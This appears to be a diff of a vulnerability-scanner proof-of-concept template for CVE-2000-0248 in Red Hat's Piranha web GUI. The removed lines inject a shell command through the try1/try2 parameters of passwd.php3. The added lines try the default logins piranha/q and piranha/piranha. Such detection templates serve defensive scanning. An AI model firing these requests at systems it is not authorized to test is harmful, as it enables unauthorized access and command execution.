@@ -1,25 +1,30 @@
 [info]
 author = "AVE"
-description = "CVE-2000-0248 是 Piranha Web Password 管理工具中的命令注入漏洞，经过认证的攻击者可通过 passwd.php3 的 try1/try2 参数注入系统命令，利用默认凭据 piranha/q 可未授权利用"
+description = "检测 Red Hat Linux 6.2 Piranha 虚拟服务器管理 Web GUI 是否存在默认后门密码漏洞。尝试使用预设凭据 piranha/q 或 piranha/piranha 登录管理界面，若登录成功则判定漏洞存在，攻击者可借此完全控制 LVS 配置并执行任意命令。"
 id = "POC-AVE-2000-0709"
-name = "CVE-2000-0248 PoC"
+name = "Red Hat Linux Piranha Default Account and Password PoC"
 severity = "critical"
-tags = ["cve-2000-0248"]
+tags = [
+    "cve-2000-0248",
+    "piranha",
+    "default-password",
+    "lvs",
+]
 vuln_id = [
     "CVE-2000-0248",
     "AVE-2000-0709",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/piranha/secure/passwd.php3"
+path = "/{{BaseURL}}/piranha/"
 protocol = "http"
 
 [poc.requests.body]
-content = "piranha=q&passwd=ACCEPT&try1=echo+POC_TEST&try2=echo+POC_TEST"
+content = "login=piranha&passwd=q&submit=Login"
 type = "raw"
 
 [poc.requests.headers]
@@ -29,4 +34,32 @@ Content-Type = "application/x-www-form-urlencoded"
 expect = true
 part = "body"
 type = "word"
-words = ["POC_TEST"]
+words = [
+    "Piranha",
+    "Configuration",
+    "Virtual Server",
+    "Logout",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/piranha/"
+protocol = "http"
+
+[poc.requests.body]
+content = "login=piranha&passwd=piranha&submit=Login"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Piranha",
+    "Configuration",
+    "Virtual Server",
+    "Logout",
+]
